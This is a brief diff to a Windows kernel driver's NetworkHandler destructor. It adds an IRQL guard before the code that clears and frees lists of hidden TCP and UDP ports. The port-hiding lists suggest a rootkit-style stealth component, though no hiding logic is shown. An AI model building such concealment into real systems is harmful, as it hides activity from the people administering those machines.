@@ -17,6 +17,8 @@ NetworkHandler::NetworkHandler() {
 
 _IRQL_requires_max_(APC_LEVEL)
 NetworkHandler::~NetworkHandler() {
+	IrqlGuard guard;
+	guard.SetExitIrql(PASSIVE_LEVEL);
 	ClearHiddenPortsList(PortType::All);
 	FreeVirtualMemory(hiddenTcpPorts.Items);
 	FreeVirtualMemory(hiddenUdpPorts.Items);
